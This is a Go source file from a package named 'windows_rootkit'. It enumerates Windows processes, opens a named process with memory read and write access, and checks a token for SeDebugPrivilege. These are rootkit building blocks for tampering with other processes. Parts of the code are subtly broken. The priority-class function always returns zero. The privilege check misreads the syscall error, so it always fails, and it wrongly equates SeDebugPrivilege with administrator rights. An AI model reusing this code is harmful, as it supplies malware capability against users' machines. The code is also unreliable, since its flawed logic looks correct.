package windows_rootkit

import (
	"syscall"
	"unsafe"
)

// CreateToolhelp32SnapshotCustom function retrieves a snapshot of the processes, heaps, modules, and threads running in the system
func CreateToolhelp32SnapshotCustom(dwFlags uint32, th32ProcessID uint32) (syscall.Handle, error) {
	ret, _, err := ProcCreateToolhelp32Snapshot.Call(uintptr(dwFlags), uintptr(th32ProcessID))
	if ret == uintptr(syscall.InvalidHandle) {
		return syscall.InvalidHandle, err
	}
	return syscall.Handle(ret), err
}

// Process32FirstCustom function retrieves information about the first process encountered in a system snapshot
func Process32FirstCustom(hSnapshot syscall.Handle, lppe *ProcessEntry32) (err error) {
	ret, _, err := ProcProcess32First.Call(uintptr(hSnapshot), uintptr(unsafe.Pointer(lppe)))
	if ret == 0 {
		return err
	}
	return nil
}

// Process32NextCustom function retrieves information about the next process recorded in a system snapshot
func Process32NextCustom(hSnapshot syscall.Handle, lppe *ProcessEntry32) (err error) {
	ret, _, err := ProcProcess32Next.Call(uintptr(hSnapshot), uintptr(unsafe.Pointer(lppe)))
	if ret == 0 {
		return err
	}
	return nil
}

// OpenProcessCustom function opens an existing local process object
func OpenProcessCustom(dwDesiredAccess uint32, bInheritHandle bool, dwProcessID uint32) (syscall.Handle, error) {
	ret, _, err := ProcOpenProcess.Call(uintptr(dwDesiredAccess), uintptr(BoolToUintptr(bInheritHandle)), uintptr(dwProcessID))
	if ret == 0 {
		return syscall.InvalidHandle, err
	}
	return syscall.Handle(ret), err
}

// GetProcessHandleByName function retrieves the handle of the process by its name
func GetProcessHandleByName(name string) (syscall.Handle, error) {
	// Create a snapshot of running processes
	snapshot, err := CreateToolhelp32SnapshotCustom(TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return syscall.InvalidHandle, err
	}
	defer syscall.CloseHandle(snapshot)

	// Initialize a ProcessEntry32 structure for iterating through processes
	var pe32 ProcessEntry32
	pe32.Size = uint32(unsafe.Sizeof(pe32))

	// Iterate through processes to find the one with the specified name
	err = Process32FirstCustom(snapshot, &pe32)
	if err != nil {
		return syscall.InvalidHandle, err
	}

	for {
		exeFile := syscall.UTF16ToString(pe32.ExeFile[:])
		if exeFile == name {
			// Found the process, open its handle
			return OpenProcessCustom(PROCESS_QUERY_INFORMATION|PROCESS_VM_READ|PROCESS_VM_WRITE|PROCESS_VM_OPERATION, false, pe32.ProcessID)
		}

		// Move to the next process
		err = Process32NextCustom(snapshot, &pe32)
		if err != nil {
			break
		}
	}

	return syscall.InvalidHandle, syscall.ERROR_NOT_FOUND
}

// GetPriorityClassCustom function gets the priority class of a process
func GetPriorityClassCustom(processHandle syscall.Handle) (uint32, error) {
	// Variable to store the priority class
	var priorityClass uint32

	// Call the GetPriorityClass function to retrieve the priority class of the process
	ret, _, err := ProcGetPriorityClass.Call(uintptr(processHandle))
	if ret == 0 {
		// If the return value is 0, it indicates an error
		return 0, err
	}

	// Return the priority class
	return priorityClass, nil
}

// IsProcessAdmin function checks if a process has administrator privileges by directly querying for SeDebugPrivilege.
func IsProcessAdmin(processHandle syscall.Handle) (bool, error) {
	// Open the process token.
	var tokenHandle syscall.Token
	_, _, err := procOpenProcessToken.Call(uintptr(processHandle), uintptr(syscall.TOKEN_QUERY), uintptr(unsafe.Pointer(&tokenHandle)))
	if err != nil {
		return false, err
	}
	defer syscall.CloseHandle(syscall.Handle(tokenHandle))

	// Define the privilege to check: SeDebugPrivilege.
	privilegeName, err := syscall.UTF16PtrFromString("SeDebugPrivilege")
	if err != nil {
		return false, err
	}

	// Lookup the LUID for SeDebugPrivilege.
	var luid LUID
	ret, _, err := procLookupPrivilegeValueW.Call(0, uintptr(unsafe.Pointer(privilegeName)), uintptr(unsafe.Pointer(&luid)))
	if ret == 0 {
		return false, err
	}

	// Check if SeDebugPrivilege is enabled for the token.
	var tokenInfoLength uint32
	err = syscall.GetTokenInformation(tokenHandle, syscall.TokenPrivileges, nil, 0, &tokenInfoLength)
	if err != nil && err != syscall.ERROR_INSUFFICIENT_BUFFER {
		return false, err
	}
	tokenInfo := make([]byte, tokenInfoLength)
	err = syscall.GetTokenInformation(tokenHandle, syscall.TokenPrivileges, &tokenInfo[0], tokenInfoLength, &tokenInfoLength)
	if err != nil {
		return false, err
	}

	// Convert token information to TOKEN_PRIVILEGES structure.
	privileges := (*TOKEN_PRIVILEGES)(unsafe.Pointer(&tokenInfo[0]))

	// Check if SeDebugPrivilege is enabled.
	for i := uint32(0); i < privileges.PrivilegeCount; i++ {
		privilege := privileges.Privileges[i]
		if privilege.Luid == luid && privilege.Attributes&SE_PRIVILEGE_ENABLED != 0 {
			return true, nil
		}
	}

	// SeDebugPrivilege is not enabled.
	return false, nil
}
